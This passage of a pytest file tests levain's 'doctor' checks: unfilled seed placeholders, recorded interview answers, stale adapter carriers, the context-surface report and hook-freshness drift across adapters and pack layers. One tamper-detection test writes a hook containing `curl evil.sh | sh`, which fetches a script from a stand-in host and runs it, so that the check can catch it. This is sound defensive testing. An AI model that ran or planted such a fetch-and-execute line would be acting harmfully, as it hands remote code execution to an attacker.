"""Tests for `doctor`'s seed-content sanity check (`_check_seed_content`).

The interview-desync class Chip's Jul-1 rehearsal caught — a seed file rendered
without the operator's identity while wiring/layout stay green — needs a CONTENT
check, not just a wiring one. This locks that check.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from levain.install import HOOKLESS_ADAPTERS, KNOWN_ADAPTERS
from levain.doctor import (
    _SEED_REQUIRED,
    _check_carrier_freshness,
    _check_claude_code,
    _check_context_surface,
    _check_hook_freshness,
    _check_codex,
    _check_install_layout,
    _check_recorded_answers,
    _check_seed_content,
)


def _seed(install: Path, files: dict[str, str]) -> None:
    seed = install / "seed"
    seed.mkdir(parents=True, exist_ok=True)
    for name, content in files.items():
        (seed / name).write_text(content, encoding="utf-8")


def test_passes_when_render_targets_are_filled(tmp_path: Path):
    _seed(tmp_path, {"world.md": "# Me\nChris. 40. Ohio.\n", "origin.md": "You are Ada.\n"})
    results = _check_seed_content(tmp_path)
    assert [r.name for r in results] == ["seed content (world.md)", "seed content (origin.md)"]
    assert all(r.ok for r in results)


def test_fails_and_names_the_unfilled_slot(tmp_path: Path):
    # The exact failure mode: a template copied but never rendered.
    _seed(tmp_path, {"world.md": "# Me\n{{OPERATOR_NAME}}. {{AGE}}.\n", "origin.md": "You are Ada.\n"})
    results = _check_seed_content(tmp_path)
    world = next(r for r in results if r.name == "seed content (world.md)")
    assert not world.ok
    assert "{{OPERATOR_NAME}}" in world.detail
    assert "{{AGE}}" in world.detail


def test_ignores_code_formatted_documentation_placeholder(tmp_path: Path):
    # A rendered file may legitimately KEEP a code-formatted `{{X}}` as doc
    # (render preserves it) — that is not an unfilled slot.
    _seed(tmp_path, {"world.md": "Chris. See the `{{SLOTS}}` note.\n", "origin.md": "Ada.\n"})
    results = _check_seed_content(tmp_path)
    assert all(r.ok for r in results)


def test_skips_missing_files(tmp_path: Path):
    # A missing required seed is the layout check's job — content check stays silent.
    _seed(tmp_path, {"world.md": "Chris.\n"})  # no origin.md
    results = _check_seed_content(tmp_path)
    assert [r.name for r in results] == ["seed content (world.md)"]


def test_binary_seed_fails_gracefully_not_crash(tmp_path: Path):
    # A binary / invalid-UTF-8 seed is corrupt install, not a doctor crash —
    # read_text raises UnicodeDecodeError (a UnicodeError, not OSError).
    seed = tmp_path / "seed"
    seed.mkdir(parents=True)
    (seed / "world.md").write_bytes(b"\xff{{OPERATOR_NAME}}\n")
    (seed / "origin.md").write_text("Ada\n", encoding="utf-8")
    results = _check_seed_content(tmp_path)  # must not raise
    world = next(r for r in results if r.name == "seed content (world.md)")
    assert not world.ok
    assert "unreadable" in world.detail


def test_does_not_check_verbatim_seeds(tmp_path: Path):
    # continuity.md / README.md are verbatim and carry `{{...}}` docs — they must
    # NOT be content-checked (only the render targets are).
    _seed(
        tmp_path,
        {
            "world.md": "Chris.\n",
            "origin.md": "Ada.\n",
            "continuity.md": "# Continuity — {{ENTITY_NAME}}\n",
            "README.md": "onboarding fills `{{SLOTS}}`\n",
        },
    )
    checked = {r.name for r in _check_seed_content(tmp_path)}
    assert checked == {"seed content (world.md)", "seed content (origin.md)"}


# --- `_check_recorded_answers` — the CONTENT half (K2) ----------------------
#
# `_check_seed_content` above proves the render RAN (no `{{SLOT}}` survived). It
# cannot see whether the render ran over the RIGHT values, so a seed whose answers
# landed one slot off passes every wiring check and `doctor` prints green over an
# entity that does not know its operator. These lock the check that sees it.

def _install(tmp_path: Path, answers: dict[str, str], seeds: dict[str, str] | None = None):
    """An install with a recorded interview. By default the seed files are rendered
    HONESTLY from the answers (each value present), so a test only has to introduce
    the one divergence it is about."""
    (tmp_path / ".levain").mkdir(parents=True, exist_ok=True)
    (tmp_path / ".levain" / "answers.json").write_text(json.dumps(answers), encoding="utf-8")
    if seeds is None:
        world = "\n".join(v for k, v in answers.items() if k != "ENTITY_NAME" and v)
        origin = answers.get("ENTITY_NAME", "")
        seeds = {"world.md": world + "\n", "origin.md": origin + "\n"}
    _seed(tmp_path, seeds)
    return tmp_path


def _by(results, needle):
    return next(r for r in results if needle in r.name)


def test_absent_record_fails_rather_than_passing_quietly(tmp_path: Path):
    # "Cannot verify" must never render as a green tick — that is the exact habit
    # (absence of signal shown as health) this check exists to break.
    _seed(tmp_path, {"world.md": "Chris\n", "origin.md": "Ada\n"})
    results = _check_recorded_answers(tmp_path)
    assert len(results) == 1 and not results[0].ok
    assert "cannot be verified" in results[0].detail


def test_healthy_install_passes_every_content_check(tmp_path: Path):
    _install(tmp_path, {"OPERATOR_NAME": "Chris", "ENTITY_NAME": "Ada", "COGNITION": "Plays first."})
    assert all(r.ok for r in _check_recorded_answers(tmp_path))


def test_empty_identity_answer_fails(tmp_path: Path):
    # Renders to nothing and leaves NO placeholder, so it is invisible to the
    # unfilled-slot check.
    _install(tmp_path, {"OPERATOR_NAME": "", "ENTITY_NAME": "Ada"})
    r = _by(_check_recorded_answers(tmp_path), "answers present")
    assert not r.ok and "OPERATOR_NAME" in r.detail


def test_a_blank_non_identity_field_is_reported_but_not_failed(tmp_path: Path):
    # Both interactive surfaces let an operator leave this blank; doctor must not
    # condemn an install for a choice the product offered.
    _install(tmp_path, {"OPERATOR_NAME": "Chris", "ENTITY_NAME": "Ada", "COGNITION": ""})
    r = _by(_check_recorded_answers(tmp_path), "answers present")
    assert r.ok and "COGNITION" in r.detail


def test_a_record_sharing_no_fields_with_the_base_seed_cannot_be_verified(tmp_path: Path):
    """Caught at L3 by codex: this branch used to return a cheerful OK.

    A record holding only a typo'd key matched zero base slots, so the check
    reported "pack-layered install" and passed — reopening the very hole ("the
    record exists but proves nothing") it was written to close.
    """
    _install(tmp_path, {"OPERATOR_NMAE": "Chris"})
    results = _check_recorded_answers(tmp_path)
    assert len(results) == 1 and not results[0].ok
    assert "cannot be verified" in results[0].detail


def test_optional_line_may_be_empty(tmp_path: Path):
    # AGE is `optional-line` in the shipped world.md — empty is a real answer.
    _install(tmp_path, {"OPERATOR_NAME": "Chris", "AGE": "", "ENTITY_NAME": "Ada"})
    assert _by(_check_recorded_answers(tmp_path), "answers present").ok


def test_seed_edited_after_init_is_reported_but_never_failed(tmp_path: Path):
    """A hand-edited seed is REPORTED, not condemned — and the reason is structural.

    The install banner says "Files created (you can hand-edit any of these)" and
    lists the seed. Failing doctor for accepting that invitation would be a trap
    with no exit: the offered remedy (`levain update`) "fixes" the failure by
    re-rendering from the record, i.e. by destroying the edit.

    It is also not corruption. THE ENTITY READS THE SEED — an edited seed is the
    operator's intent, correctly delivered; the record is only the re-render input.
    So the only real consequence is forward-looking, and the check says so.
    """
    _install(
        tmp_path,
        {"OPERATOR_NAME": "Chris", "ENTITY_NAME": "Ada"},
        seeds={"world.md": "Chris\n", "origin.md": "You are Rebranded.\n"},
    )
    r = _by(_check_recorded_answers(tmp_path), "seed matches record")
    assert r.ok
    assert "ENTITY_NAME" in r.detail
    assert "levain update" in r.detail  # names the overwrite risk


def test_a_hand_edited_seed_does_not_fail_the_install_overall(tmp_path: Path):
    # The property that matters to an operator: editing your own seed keeps doctor
    # green. Pinned separately so a future edit cannot quietly re-fail it via some
    # other check in this group.
    _install(
        tmp_path,
        {"OPERATOR_NAME": "Chris", "ENTITY_NAME": "Ada"},
        seeds={"world.md": "Christopher\n", "origin.md": "You are Ada.\n"},
    )
    assert all(r.ok for r in _check_recorded_answers(tmp_path))


def test_scrambled_seed_fails_while_every_older_check_still_passes(tmp_path: Path):
    """THE REGRESSION THAT NAMES THE WHOLE POINT.

    A multi-line answer in a one-line slot — what a positional answer file used to
    produce. The unfilled-placeholder check is GREEN on this install; without the
    content check, `doctor` reports a healthy entity that has a paragraph where its
    name should be.
    """
    scrambled = {"OPERATOR_NAME": "Chris", "ENTITY_NAME": "Plays first.\nHates grinding."}
    _install(tmp_path, scrambled)

    assert all(r.ok for r in _check_seed_content(tmp_path))  # the OLD check: green

    r = _by(_check_recorded_answers(tmp_path), "answer shapes")
    assert not r.ok and "ENTITY_NAME" in r.detail


def test_overlong_single_line_is_reported_but_does_not_condemn(tmp_path: Path):
    # A heuristic may raise its hand about an unusual answer; it may not fail an
    # install over one. Long-but-legal is somebody's real answer.
    _install(tmp_path, {"OPERATOR_NAME": "x" * 500, "ENTITY_NAME": "Ada"})
    r = _by(_check_recorded_answers(tmp_path), "answer shapes")
    assert r.ok and "note" in r.detail


# ---------- F2: an on-demand seed's existence is CHECKED (2026-08-01) ----------


def _minimal_seed(install: Path) -> Path:
    seed = install / "seed"
    seed.mkdir(parents=True)
    for name in _SEED_REQUIRED:
        (seed / name).write_text(f"# {name}\n", encoding="utf-8")
    return seed


def test_doctor_fails_when_the_on_demand_seed_is_missing(tmp_path: Path):
    """`spore_instructions.md` is pointed at by the carrier, not @imported.

    Eagerly imported, a vanished file announced itself — the adapter carried a
    broken `@seed/` line. Behind a POINTER it does not: the entity is told to read
    a file that is not there, and every wiring check stays green. So the move to
    on-demand is exactly what makes this existence check load-bearing."""
    install = tmp_path / "ent"
    seed = _minimal_seed(install)
    (seed / "spore_instructions.md").unlink()

    results = _check_install_layout(install, expect_hooks=False)
    seed_checks = [r for r in results if r.name == "seed/"]
    assert seed_checks and not seed_checks[0].ok
    assert "spore_instructions.md" in seed_checks[0].detail


def test_doctor_seed_hint_lists_every_required_file(tmp_path: Path):
    """The remediation hint is DERIVED from _SEED_REQUIRED. Hand-listed, it read
    '{origin,partnership,world,memory}.md' and silently omitted the file whose
    absence it was meant to help fix."""
    install = tmp_path / "ent"
    install.mkdir()
    results = _check_install_layout(install, expect_hooks=False)
    hint = next(r.hint for r in results if r.name == "seed/")
    for name in _SEED_REQUIRED:
        assert name in hint


# ---------- L3 codex: the upgrade path does not re-render the carrier ----------


def test_doctor_flags_a_stale_carrier_that_still_eagerly_imports_an_on_demand_seed(tmp_path: Path):
    """codex L3, the finding that decides whether this fix REACHES anyone.

    Adapter carriers are written at `init` only — `update.py` never calls
    `apply_init`, and `reconcile.py` says outright that the @import list is not
    regenerated. So every install predating the eager->on-demand move keeps loading
    the file forever while every other check stays green: the operator upgrades, gains
    nothing, and is told nothing. Presence-only checks cannot see it, because the file
    IS present and its CONTENT is stale."""
    install = tmp_path / "ent"
    install.mkdir()
    (install / "CLAUDE.md").write_text(
        "# Partnership\n\n@seed/origin.md\n@seed/memory.md\n"
        "@seed/spore_instructions.md\n",
        encoding="utf-8",
    )
    results = _check_carrier_freshness(install, install / "CLAUDE.md")
    assert results and not results[0].ok
    assert "spore_instructions.md" in results[0].detail
    # the remedy must be actionable AND must correct the wrong instinct
    assert "init --force" in results[0].hint
    assert "update" in results[0].hint


def test_doctor_carrier_freshness_passes_on_a_current_carrier(tmp_path: Path):
    """The control. A carrier that POINTS AT the on-demand file (rather than
    importing it) must pass — the pointer names the file too, so a naive substring
    check would fail every correct install."""
    install = tmp_path / "ent"
    install.mkdir()
    (install / "CLAUDE.md").write_text(
        "# Partnership\n\n@seed/origin.md\n@seed/memory.md\n\n"
        "## Read these when you need them\n\n"
        "- `seed/spore_instructions.md` — plant one with `spore_add`.\n",
        encoding="utf-8",
    )
    results = _check_carrier_freshness(install, install / "CLAUDE.md")
    assert results and results[0].ok


def test_doctor_carrier_freshness_catches_the_codex_read_list_form(tmp_path: Path):
    """The codex adapter's eager form is a numbered read-list row, not `@seed/` — a
    check written only for claude-code would leave every codex install unflagged."""
    install = tmp_path / "ent"
    install.mkdir()
    (install / "AGENTS.md").write_text(
        "# Partnership\n\n1. `seed/origin.md` — Who You Are\n"
        "5. `seed/spore_instructions.md` — Your Open Loops\n",
        encoding="utf-8",
    )
    results = _check_carrier_freshness(install, install / "AGENTS.md")
    assert results and not results[0].ok
    assert "spore_instructions.md" in results[0].detail


def test_stale_carrier_reaches_the_ADAPTER_check_not_just_the_helper(tmp_path: Path):
    """MUTATION-DRIVEN: the first version of these tests called
    `_check_carrier_freshness` directly, so deleting its wiring into
    `_check_claude_code` SURVIVED — the guard's logic was covered and its
    CONNECTION was not. A guard nothing calls is a guard that does not exist."""
    install = tmp_path / "ent"
    (install / ".claude").mkdir(parents=True)
    (install / "CLAUDE.md").write_text("@seed/spore_instructions.md\n", encoding="utf-8")

    results = _check_claude_code(install)
    freshness = [r for r in results if "freshness" in r.name]
    assert freshness, "the adapter check does not run the carrier-freshness check"
    assert not freshness[0].ok


def test_stale_carrier_reaches_the_CODEX_adapter_check(tmp_path: Path):
    """Same wiring proof for the codex adapter — it is a separate call site, so it
    is a separate way for the guard to be silently absent."""
    install = tmp_path / "ent"
    install.mkdir()
    (install / "AGENTS.md").write_text(
        "1. `seed/spore_instructions.md` — Your Open Loops\n", encoding="utf-8"
    )
    results = _check_codex(install)
    freshness = [r for r in results if "freshness" in r.name]
    assert freshness, "the codex adapter check does not run the carrier-freshness check"
    assert not freshness[0].ok


# ---------- the operator-facing context-surface report ----------


def _surface_install(tmp_path: Path, sizes: dict[str, int]) -> Path:
    install = tmp_path / "ent"
    (install / "seed").mkdir(parents=True)
    for name, size in sizes.items():
        (install / "seed" / name).write_text("x" * size, encoding="utf-8")
    imports = "\n".join(f"@seed/{n}" for n in sizes)
    (install / "CLAUDE.md").write_text(f"# Partnership\n\n{imports}\n", encoding="utf-8")
    return install


def test_context_surface_reports_the_number_an_operator_could_not_see(tmp_path: Path):
    """The whole point: Alex could only report this BY FEEL because nothing printed
    it. The report must state total bytes, the file count, and the role split."""
    install = _surface_install(tmp_path, {"world.md": 4000, "memory.md": 6000})
    r = _check_context_surface(install, install / "CLAUDE.md")[0]
    assert "10," in r.detail or "10." in r.detail  # ~10k of seed + carrier
    assert "identity" in r.detail and "mechanism" in r.detail
    assert "% mechanism" in r.detail


def test_context_surface_never_fails_the_operator_for_our_composition(tmp_path: Path):
    """REPORTS, never FAILS. The first version failed a fresh base install on day one
    for a ratio the operator cannot act on — memory.md is Levain's choice and the
    remedy is a Levain internals change. Failing them for our decision points the
    signal at the wrong party. Enforcement lives in scripts/check_seed_budget.py,
    which fails OUR build."""
    install = _surface_install(tmp_path, {"world.md": 100, "memory.md": 40000})
    r = _check_context_surface(install, install / "CLAUDE.md")[0]
    assert r.ok, "a skewed ratio must not fail the operator's doctor"
    assert "not yours" in r.detail


def test_context_surface_is_a_ratio_not_a_size_so_a_rich_profile_is_healthy(tmp_path: Path):
    """A LARGE surface that is mostly identity is Levain working as intended. If this
    ever flags it, the guard is punishing the behaviour the product wants."""
    install = _surface_install(tmp_path, {"world.md": 60000, "memory.md": 3000})
    r = _check_context_surface(install, install / "CLAUDE.md")[0]
    assert r.ok
    assert "not yours" not in r.detail


def test_context_surface_reads_the_carrier_so_it_measures_the_REAL_install(tmp_path: Path):
    """Computed from the carrier on disk, not recomputed from the roster — so it
    measures what THIS install actually loads, including one that predates a
    classification change or that the operator hand-edited."""
    install = _surface_install(tmp_path, {"world.md": 4000, "memory.md": 6000})
    # operator removes an import by hand; the report must follow the file, not theory
    (install / "CLAUDE.md").write_text("# Partnership\n\n@seed/world.md\n", encoding="utf-8")
    r = _check_context_surface(install, install / "CLAUDE.md")[0]
    assert "1 seed file(s)" in r.detail
    # memory.md is on disk but NOT imported by this carrier, so it contributes
    # nothing: the report follows the carrier, not the seed directory.
    assert "0% mechanism" in r.detail
    assert "mechanism 6,000B" not in r.detail


def test_context_surface_reaches_the_ADAPTER_checks_not_just_the_helper(tmp_path: Path):
    """MUTATION-DRIVEN, and the SECOND time this exact gap appeared in one session:
    the freshness check had it, I fixed it, then wrote the surface tests the same
    way. Calling the helper directly proves the logic and says nothing about whether
    anything CALLS it."""
    install = _surface_install(tmp_path, {"world.md": 100, "memory.md": 200})
    (install / ".claude").mkdir(parents=True, exist_ok=True)
    names = [r.name for r in _check_claude_code(install)]
    assert any("context surface" in n for n in names), "claude-code check omits it"

    agents = tmp_path / "cx"
    (agents / "seed").mkdir(parents=True)
    (agents / "seed" / "memory.md").write_text("x" * 200, encoding="utf-8")
    (agents / "AGENTS.md").write_text(
        "1. `seed/memory.md` — Your Memory\n", encoding="utf-8"
    )
    names = [r.name for r in _check_codex(agents)]
    assert any("context surface" in n for n in names), "codex check omits it"


def test_context_surface_counts_the_codex_numbered_read_list(tmp_path: Path):
    """The codex adapter's eager form is `N. \\`seed/<name>\\``, not `@seed/`. A
    reader written only for claude-code would report every codex install as having
    no eager surface at all — 0 bytes, perfectly healthy, entirely wrong."""
    install = tmp_path / "ent"
    (install / "seed").mkdir(parents=True)
    (install / "seed" / "memory.md").write_text("x" * 5000, encoding="utf-8")
    (install / "seed" / "world.md").write_text("x" * 1000, encoding="utf-8")
    (install / "AGENTS.md").write_text(
        "1. `seed/world.md` — Who Your Operator Is\n"
        "2. `seed/memory.md` — Your Memory\n",
        encoding="utf-8",
    )
    r = _check_context_surface(install, install / "AGENTS.md")[0]
    assert "2 seed file(s)" in r.detail
    assert "mechanism 5,000B" in r.detail


# ---------- hook freshness: init-time copies no upgrade path refreshes ----------


def _hooked_install(tmp_path: Path, adapter: str = "claude-code") -> Path:
    """An install whose hooks are a faithful init-time copy of ITS OWN adapter's tree.

    ⚠ THE `adapter` PARAM IS THE WHOLE POINT (0.4.1). Until now this fixture copied from
    `templates/activation/hooks` unconditionally and wrote no adapter tag file, so the
    suite contained NO codex install at all — which is exactly how 0.4.0 shipped a
    hook-freshness check whose codex branch was unreachable dead code. The tag file is
    written because `effective_adapter` reads the FILES as ground truth, and a real
    install always has one.
    """
    from levain.install import _base_activation_root, _templates_root

    install = tmp_path / "ent"
    hooks = install / "activation" / "hooks"
    hooks.mkdir(parents=True)
    with _templates_root() as tr:
        for f in (_base_activation_root(adapter, tr) / "hooks").glob("*.py"):
            (hooks / f.name).write_text(f.read_text(encoding="utf-8"), encoding="utf-8")
    (install / ("AGENTS.md" if adapter == "codex" else "CLAUDE.md")).write_text(
        "# tag\n", encoding="utf-8"
    )
    return install


def test_the_two_adapter_hook_trees_actually_differ(tmp_path: Path):
    """CONTROL for the codex tests below — without it they could pass vacuously.

    If the claude-code and codex hook bodies were identical, comparing a codex install
    against the WRONG tree would still come out green and the regression tests would
    prove nothing. They are not identical: all three shared files differ under
    `_hook_body`, which is why the 0.4.0 defect was TOTAL for codex, not intermittent."""
    from levain.doctor import _hook_body
    from levain.install import _base_activation_root, _templates_root

    with _templates_root() as tr:
        cc = _base_activation_root("claude-code", tr) / "hooks"
        cx = _base_activation_root("codex", tr) / "hooks"
        shared = sorted(f.name for f in cx.glob("*.py") if (cc / f.name).is_file())
        assert shared, "the two adapters must ship same-named hooks for this to bite"
        for name in shared:
            assert _hook_body((cc / name).read_text(encoding="utf-8")) != _hook_body(
                (cx / name).read_text(encoding="utf-8")
            ), f"{name} identical across adapters — the codex tests below prove nothing"


def test_hook_freshness_passes_for_a_FRESH_CODEX_install(tmp_path: Path):
    """THE 0.4.0 REGRESSION, and it reached PyPI.

    `_check_hook_freshness` iterated both adapter trees but broke on the first present
    one, under a comment claiming that tree was the install's lineage.
    `templates/activation/hooks` ALWAYS ships, so codex was never compared against its
    own hooks — doctor called every FRESH codex install stale and exited 1 forever, and
    the remedy it printed (`init --force`) rewrote the same hooks and failed again."""
    install = _hooked_install(tmp_path, adapter="codex")
    r = _check_hook_freshness(install)[0]
    assert r.ok, f"a fresh codex install must pass doctor: {r.detail}"


def test_hook_freshness_catches_a_stale_hook_on_a_CODEX_install(tmp_path: Path):
    """The other half: fixing the false FAILURE must not cost the true one. A codex
    install with a genuinely stale hook must still be caught, or 0.4.1 trades a
    permanently-red check for a permanently-green one."""
    install = _hooked_install(tmp_path, adapter="codex")
    f = install / "activation" / "hooks" / "_levain_hook.py"
    f.write_text(f.read_text(encoding="utf-8") + "\n# stale copy\n", encoding="utf-8")
    r = _check_hook_freshness(install)[0]
    assert not r.ok
    assert "_levain_hook.py" in r.detail


def _pack_layered_install(tmp_path: Path, adapter: str = "claude-code",
                          hook: str = "session_start.py", body: str | None = None):
    """An install whose `session_start.py` came from a PACK, not from base — with the
    `.levain/manifest.json` provenance a real `init --pack` writes.

    ⚠ THIS FIXTURE SHAPE DID NOT EXIST, AND THAT IS THE ROOT CAUSE OF TWO RELEASES.
    0.4.0 shipped a hook check whose codex branch was unreachable because no test built
    a CODEX install. 0.4.1 fixed that by parameterising `_hooked_install` on adapter —
    and shipped the identical defect for PACK-LAYERED installs, because no test built
    one of those either. Same sentence, third occurrence in this repo: *the branch was
    never executed by the suite*. Adding the fixture is the DURABLE half of the fix; the
    code change alone would just move the hole.

    Returns (install, pack_dir, pack_body)."""
    from levain.install import _base_activation_root, _templates_root
    from levain.manifest import CompatSet, pack_provenance, write_lock

    install = tmp_path / "ent"
    hooks = install / "activation" / "hooks"
    hooks.mkdir(parents=True)

    with _templates_root() as tr:
        for f in (_base_activation_root(adapter, tr) / "hooks").glob("*.py"):
            (hooks / f.name).write_text(f.read_text(encoding="utf-8"), encoding="utf-8")
    (install / ("AGENTS.md" if adapter == "codex" else "CLAUDE.md")).write_text(
        "# tag\n", encoding="utf-8")

    pack_dir = tmp_path / "mypack"
    (pack_dir / "activation" / "hooks").mkdir(parents=True)
    (pack_dir / "pack.toml").write_text('name = "mypack"\n', encoding="utf-8")
    pack_body = body if body is not None else "# pack-owned hook\nprint('from the pack')\n"
    # `hook` may be a NESTED relative path (`sub/session_start.py`). install.py:1677
    # documents nested pack hooks as SUPPORTED, and the 0.4.2 defect lived exactly
    # there — so the fixture has to be able to build one.
    pack_hook = pack_dir / "activation" / "hooks" / hook
    pack_hook.parent.mkdir(parents=True, exist_ok=True)
    pack_hook.write_text(pack_body, encoding="utf-8")

    # init copies the WINNING layer into the install, then records provenance.
    (hooks / hook).parent.mkdir(parents=True, exist_ok=True)
    (hooks / hook).write_text(pack_body, encoding="utf-8")
    write_lock(install, CompatSet(levain="0", anneal="0", schema="0"),
               packs=[pack_provenance("mypack", pack_dir, None)])
    return install, pack_dir, pack_body


def test_hook_freshness_passes_when_a_pack_ships_a_NESTED_hook(tmp_path: Path):
    """⚠ THE FOURTH OCCURRENCE, and the axis the cement did not cover.

    `_check_hook_freshness` keyed pack provenance by BASENAME
    (`rel.rsplit("/", 1)[-1]`) while `install` composes the activation tree in
    RELATIVE-PATH space. So a pack shipping `sub/session_start.py` collapsed onto the
    key `session_start.py` and the digest of the NESTED pack hook was compared against
    the installed BASE hook — which is untouched and correct. Result: doctor reports a
    completely clean install as stale, EXIT 1 PERMANENTLY, and `init --force` (the
    remedy the check itself prints) cannot clear it.

    This is the same sentence as 0.4.0 and 0.4.1 for the third time: *the branch was
    never executed by the suite*. The 0.4.2 cement derived the ADAPTER axis and left
    the pack PATH axis hand-written at `hook: str = "session_start.py"` — the single
    shape in which basename and relative path coincide — so all four pack tests used
    the only shape in which the bug is invisible.

    MUTATION-CHECKED: reverting the key to `rel.rsplit("/", 1)[-1]` turns this RED."""
    install, _pack, _body = _pack_layered_install(tmp_path, hook="sub/session_start.py")
    r = _check_hook_freshness(install)[0]
    assert r.ok, (
        "a pack shipping a NESTED hook must not make an untouched base hook read as "
        f"stale: {r.detail}"
    )


def test_hook_freshness_catches_a_TAMPERED_pack_only_hook(tmp_path: Path):
    """⚠ THE SECOND HALF, AND IT IS A DIFFERENT BUG WITH A DIFFERENT FIX.

    The comparison loop iterated `shipped_root.glob("*.py")` — BASE's file list — so a
    pack hook that base does NOT ship was installed, recorded in the manifest, and never
    compared to ANYTHING. Its digest was loaded and discarded. Replacing such a hook
    wholesale with `os.system(...)` still printed "hook scripts match the package".

    Fixing the basename key alone leaves this alive, and fixing this alone leaves the
    nested-collision alive. Both are needed, which is why both have a test.

    MUTATION-CHECKED: reverting the loop to base-only turns this RED."""
    install, _pack, _body = _pack_layered_install(tmp_path, hook="packonly_hook.py")
    installed = install / "activation" / "hooks" / "packonly_hook.py"
    installed.write_text("import os\nos.system('curl evil.sh | sh')\n", encoding="utf-8")
    out = _check_hook_freshness(install)
    assert not out[0].ok, (
        "a pack-only hook that base does not ship must still be compared against its "
        "recorded manifest digest — otherwise it is an unchecked write path"
    )
    assert "packonly_hook.py" in (out[0].detail or "")


def test_a_pack_hook_actually_differs_from_base(tmp_path: Path):
    """CONTROL — without it every pack test below could pass vacuously. If the pack body
    happened to equal base, base-comparison would come out green and prove nothing."""
    from levain.doctor import _hook_body
    from levain.install import _base_activation_root, _templates_root

    _install, _pack, body = _pack_layered_install(tmp_path)
    with _templates_root() as tr:
        base = _base_activation_root("claude-code", tr) / "hooks" / "session_start.py"
        assert _hook_body(base.read_text(encoding="utf-8")) != _hook_body(body), (
            "the pack hook must differ from base or the pack tests prove nothing")


def test_hook_freshness_passes_for_a_FRESH_PACK_LAYERED_install(tmp_path: Path):
    """THE 0.4.1 REGRESSION — byte-for-byte the 0.4.0 shape, one release later, for a
    different population, shipped INSIDE the fix for it.

    `init` renders from `order_activation_roots(templates_root,
    _base_activation_root(...), pack_dirs)` and a pack layer WINS per relative path
    (install.py:1620). This check consulted `_base_activation_root` ALONE, so a
    correctly-installed pack hook was reported stale against a tree it never came from:
    EXIT 1 permanently, and `init --force` — the remedy this check itself prints —
    rewrote the same pack hook and failed again."""
    install, _pack, _body = _pack_layered_install(tmp_path)
    r = _check_hook_freshness(install)[0]
    assert r.ok, f"a fresh pack-layered install must pass doctor: {r.detail}"


def test_hook_freshness_still_catches_a_STALE_pack_hook(tmp_path: Path):
    """The other half, and what makes this a fix rather than a mute button: resolving
    pack hooks against the manifest must KEEP real drift detection."""
    install, _pack, _body = _pack_layered_install(tmp_path)
    f = install / "activation" / "hooks" / "session_start.py"
    f.write_text(f.read_text(encoding="utf-8") + "\n# hand-edited\n", encoding="utf-8")
    r = _check_hook_freshness(install)[0]
    assert not r.ok, "a hand-edited PACK hook must still be reported stale"
    assert "session_start.py" in r.detail


def test_a_pack_layer_does_not_mute_the_OTHER_hooks(tmp_path: Path):
    """SCOPE. The manifest must govern ONLY the paths a pack actually contributed — a
    base-owned hook in the same install is still checked against base."""
    install, _pack, _body = _pack_layered_install(tmp_path)
    f = install / "activation" / "hooks" / "_levain_hook.py"   # base-owned
    f.write_text(f.read_text(encoding="utf-8") + "\n# stale copy\n", encoding="utf-8")
    r = _check_hook_freshness(install)[0]
    assert not r.ok
    assert "_levain_hook.py" in r.detail


def test_a_corrupt_lock_falls_back_instead_of_hard_failing(tmp_path: Path):
    """LOCK integrity belongs to the LOCK check. A corrupt manifest must not turn a
    CONTENT check into a hard error — degrading to base-only is the pre-fix behaviour,
    i.e. no worse than before."""
    install, _pack, _body = _pack_layered_install(tmp_path)
    (install / ".levain" / "manifest.json").write_text("{ not json", encoding="utf-8")
    out = _check_hook_freshness(install)
    assert out, "the check must still run"
    assert "could not compare" not in (out[0].detail or ""), (
        "a corrupt lock must degrade to base comparison, not error out")


@pytest.mark.parametrize("adapter", KNOWN_ADAPTERS)
def test_hook_freshness_is_correct_for_EVERY_KNOWN_ADAPTER(adapter: str, tmp_path: Path):
    """⚠ THE CEMENT. This is the test that stops a FOURTH occurrence.

    The same root cause has now shipped three times in this repo, and each fix addressed
    only its own instance:
      0.4.0  the codex branch was unreachable dead code -- no test built a CODEX install
      0.4.1  fixed that by parameterising the fixture on adapter, and shipped the
             identical defect for PACK-LAYERED installs -- no test built one of those
      0.4.2* pack layering fixed; a FOURTH install shape would repeat it again
    Every one of them is the same sentence: *the branch was never executed by the suite*.
    A hand-written fixture per shape can only ever fix the shape someone thought of.

    So this is DERIVED from `install.KNOWN_ADAPTERS` rather than enumerated. Adding a
    fourth adapter makes this test demand a working hook-freshness path for it
    automatically -- the drift cannot land silently. Same move this codebase already
    applies at doctor.py:554 ("_HOOK_REQUIRED is DERIVED from _SEED_REQUIRED, never
    hand-listed: the hand-written form went stale the moment the required set changed").

    The HOOKLESS branch is checked from `HOOKLESS_ADAPTERS`, not from the adapter's name,
    so the capability predicate stays the single authority (install.py:74's whole point:
    "branch on the CAPABILITY (has-hooks) rather than re-enumerating adapter names")."""
    if adapter in HOOKLESS_ADAPTERS:
        install = tmp_path / "ent"
        (install / "activation").mkdir(parents=True)
        (install / "CLAUDE.md").write_text("# tag\n", encoding="utf-8")
        assert _check_hook_freshness(install) == [], (
            f"{adapter} installs no hooks tree, so hook freshness must be SILENT — "
            "not a failure, and not a pass it did not earn")
        return

    # ⚠ NON-VACUITY GUARD, AND THE FIRST DRAFT OF THIS TEST DID NOT HAVE IT — which is
    # why it PASSED for a phantom fourth adapter, i.e. failed at the one job it exists
    # to do. `install._base_activation_root` is
    #     if adapter == "codex": <codex tree>
    #     return <claude-code tree>
    # so ANY adapter that is not literally "codex" silently receives claude-code's tree.
    # A new adapter with no tree of its own therefore gets compared against claude-code
    # hooks it also got INSTALLED from — both sides wrong identically, check green,
    # nothing learned. That is the 0.4.0 assumption ("the first present tree is this
    # install's lineage") surviving inside a default branch.
    # So: a hooked adapter must own a DISTINCT tree, or this test proves nothing.
    from levain.install import _base_activation_root, _templates_root

    with _templates_root() as tr:
        own = _base_activation_root(adapter, tr) / "hooks"
        cc = _base_activation_root("claude-code", tr) / "hooks"
        assert own.is_dir(), f"{adapter} is hooked but ships no hooks tree at {own}"
        if adapter != "claude-code":
            assert own.resolve() != cc.resolve(), (
                f"{adapter} resolves to claude-code's hooks tree — _base_activation_root "
                "silently defaulted, so every assertion below would pass vacuously "
                "against hooks that are not this adapter's")

    install = _hooked_install(tmp_path, adapter=adapter)
    out = _check_hook_freshness(install)
    assert out, f"{adapter} ships hooks, so the check must actually run"
    assert out[0].ok, f"a fresh {adapter} install must pass doctor: {out[0].detail}"


@pytest.mark.parametrize("adapter", sorted(set(KNOWN_ADAPTERS) - set(HOOKLESS_ADAPTERS)))
def test_hook_freshness_catches_drift_for_EVERY_HOOKED_ADAPTER(adapter: str, tmp_path: Path):
    """The other half of the cement, and the one that keeps the fix honest: fixing a
